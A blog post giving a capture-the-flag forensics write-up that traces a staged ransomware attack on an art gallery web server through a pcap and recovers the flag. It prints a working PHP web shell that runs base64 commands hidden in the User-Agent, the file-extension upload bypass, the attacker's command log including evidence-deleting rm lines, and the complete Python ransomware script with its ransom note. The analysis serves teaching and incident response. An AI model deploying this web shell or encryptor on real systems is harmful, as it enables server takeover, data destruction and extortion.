---
layout: post
title:  "Anatomy of a ransomware attack"
summary: "Analyze a ransomware attack though network traffic"
author: trigleos
date: '2021-03-25 20:00:00 +0200'
category: ['Networking','Threat_Hunting','Forensics']
tags: Forensics, Threat Hunting, Networking, wireshark
thumbnail: /assets/img/posts/ransomware-anatomy/ransom.png
keywords: Forensics, Threat Hunting, Networking, wireshark
usemathjax: false
permalink: /blog/ransomware-anatomy/
---
# Art Gallery
## TL;DR
Analyze a ransomware attack though network traffic
## Description
This was a Forensics challenge from the DaVinciCTF, where my team irNoobs managed to finish on the 4th place. This challenge particularly was extremely interesting as it closely mirrored an investigation of a ransomware attack, from the initial infection vector to the encryption routine.

**Challenge Description**: Alert! A famous online art gallery has just suffered an intrusion! The hacker has deployed a ransomware and demands an exorbitant ransom to return all of the gallery’s data… Fortunately, their teams had the presence of mind to capture the network at the time of the attack! You must help them recover their art, at least their most famous, “Flag sur fond de soleil couchant”. Its value is inestimable… Be careful, this pirate seems methodical and experienced! Tracing a precise history of the attack should help you see more clearly!

The challenge gives us an artgallery.pcap.xz file. You can find it at https://github.com/Trigleos/CTF/blob/master/dvCTF2021/artgallery.pcap.xz


## Initial analysis
A quick unxz after, we have a huge pcap file, with a bunch of useless stuff. The traffic we need to analyze this attack is at the bottom of the file. First, let’s extract the website of the art gallery and see what it looks like. You can do this easily by opening up the pcap file in wireshark and extracting HTTP objects. After rebuilding the homepage, the website looks like this:

![first webpage](/assets/img/posts/ransomware-anatomy/webpage1.png)

![second webpage](/assets/img/posts/ransomware-anatomy/webpage2.png)

The webpage isn’t really complicated, the only thing you can do is upload images. If you upload an image, the webiste calls upload.php, which we don’t have access to. This form might be exploitable if it is wrongly configured, so let’s investigate further and see what the attacker did to breach the website.
## Pentesting the website
Starting from packet 373300, we can see HTTP calls to upload.php. The first POST contains a test.jpg image so let’s take a look at it:

![test image](/assets/img/posts/ransomware-anatomy/test.jpg)

There’s nothing hidden inside, just this simple image so let’s take a look at the next POST request. It contains the same file, however there’s one major difference. The name of the image was changed to **test.jpg.php**. Even though this file has a dangerous extension, the website still responds with:
**Thank you for your confidence. Your artwork is ready to be shared !**
This is clearly a vulnerability as an attacker could exploit this to upload php scripts that he can execute to compromise the webserver. Let’s take a look at the last POST request to /upload.php. This time the request contains an helper.php file that contains the following code:
```php
<?php eval(base64_decode("JHBheWxvYWQgPSBlbmQoZXhwbG9kZSgiOyIsICRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSkpOwpzeXN0ZW0oYmFzZTY0X2RlY29kZSgiJHBheWxvYWQiKSk7")); ?>
```
The code first decodes the base64 encoded payload and then calls eval on it, which simply executes the string as code. When we decode the base64 payload, we get the following:
```php
$payload = end(explode(";", $_SERVER["HTTP_USER_AGENT"]));
system(base64_decode("$payload"));
```
So let’s quickly analyze this code. explode() splits a strings into multiple values and end() takes the last value of an array. So the first line splits the HTTP User-Agent string by the ; character and then takes the last value of that array and saves it in $payload. The next line simply base64 decodes that value and then executes it on the system. So we know now how the attacker is planning on bringing his payload onto the webserver. He’ll append base64 encoded bash commands to the end of the HTTP User-Agent string, which will then get executed on the system
## Exploiting the vulnerability

Now that we know how the attacker plans on executing stuff on the server, let’s see if we can find one example of this. We can find a request to helper.php at packet number 373437. The User-Agent for this reqeust is the following:
```
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36;bHM=
```
Now we take the last value after a ; which is bHM= and we base64 decode it to get ls
We can find the answer to this GET request a few packets down and it contains the plaintext:
```
RANSOM_README.txt

back_to_school.jpg

book_and_knives.jpg

dead_cameras.jpg

dont_just_stand_there.jpg

flag_sur_fond_de_soleil_couchant.jpg

helper.php

test.jpg

test.jpg.php

tools_and_dust.jpg
```
Now we know that the exploit works and we need to extract every User-Agent out of this pcap to get the entire payload.
My teammate Nick came up with a tshark command that did this very quickly while I simply went through the pcap and extracted each User-Agent by hand. Here’s his command:
```bash
tshark -Y 'http.request.uri=="/uploads/helper.php"' -T fields -e http.host -e http.user_agent -r artgallery.pcap | awk -F ';' '{print $3}' | uniq > base64_enc.txt
cat base64_enc.txt | base64 -d
```
If we run this, we get the following decoded commands:
```bash
ls 
python3 --version 
echo -n '#!/usr/bin/python3' >> ransom_v1.py 
echo -n 'from Crypto.Cipher import AES' >> ransom_v1.py 
echo -n 'import time, os' >> ransom_v1.py 
echo -n 'from hashlib import md5' >> ransom_v1.py
.
.
.
python3 ./ransom_v1.py
rm test.jpg
rm test.jpg.php
rm ransom_v1.py
rm helper.php
```
We can see that the attacker first checks if python3 is on the system, then crafts a python script called ransom_v1.py and executes it and finally deletes all evidence. So now, we need to reconstitute the python script and see what it does.
## Analyzing the ransomware
If we put all the echo commands together, we get the following python script:
```python
#!/usr/bin/python3
from Crypto.Cipher import AES
import time, os
from hashlib import md5

BS = 128
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode("utf-8")

key = b"RLY_SECRET_KEY_!"  #key used for the AES encryption
iv = md5((b"%d" % time.time()).zfill(16)).digest()  #IV based on current epoch
cipher = AES.new(key, AES.MODE_CBC, iv)

files = os.listdir(".")  #lists all files in the current directory
for file in files:
    ext = file.split(".")[-1]
    if os.path.isdir(file) != True and (ext == "png" or ext == "jpg"):  #checks if file is an image file
        with open(file, "rb") as f:
            data = f.read()
        with open(file, "wb") as f:
            f.write(cipher.encrypt(pad(data)))  #encrypts opened file

with open("RANSOM_README.txt","wb") as f:
    f.write(b"""All your works of art have been encrypted with military grade encryption ! 
To recover them, please send 1000000000 bitcoins to 12nMSc17YjeD6fSQDjab8yfmV7b6qbKRS9
Do not try to find me (I use VPN and d4rkn3t to hide my ass :D) !!""")
```

The script encrypts image files using AES. We can easily reverse this because we know what the key is and we can get the IV by looking at the time at which the python3 ./ransom_v1.py command got send to the server. In our case, this would be a time of 1611844509, which you can find in packet 374551.
Now we only need to extract the encrypted flag_sur_fond_de_soleil_couchant.jpg file which luckily for us is part of the pcap file. When we have all that, our decryption code looks like this:

```python
from Crypto.Cipher import AES
from hashlib import md5

key = b"RLY_SECRET_KEY_!"  #key used for the AES encryption
iv = md5((b"%d" % 1611844509).zfill(16)).digest()  #IV based on current epoch
cipher = AES.new(key, AES.MODE_CBC, iv)

with open("flag_sur_fond_de_soleil_couchant.jpg", "rb") as f:
    data = f.read()
with open("flag_sur_fond_de_soleil_couchant_decrypted.jpg", "wb") as f:
    f.write(cipher.decrypt(data))  #decrypts image file
```

Unfortunately, this does not return a completely correct jpg file. the first 16 bytes aren’t correct because the IV was actually a different one than the one we used. I tried bruteforcing the IV but to no avail. Later, it turned out that someone did a mistake with this and the image was wrongly encrypted. However, luckily for us, it seems that the author used photoshop to put the flag into this image, because if we analyze the file with strings (A wrong IV only affects the first 16 bytes), we can find the following text:
```
photoshop:LayerText="dvCTF{t1m3_i5_n0t_r4nd0m_en0ugh}"
```
So the text was put onto the image as a Layer, which is why we can see it here. This means that the flag is dvCTF{t1m3_i5_n0t_r4nd0m_en0ugh}
## Conclusion
This was a really interesting challenge. It made you analyze an entire attack and understand every aspect of it, from the initial vulnerability in upload.php to the execution of commands on the server. This was also one of the first CTFs where my team and I managed to win something. Everyone really put the effort in and in the end it payed off. Until next time.
-Trigleos

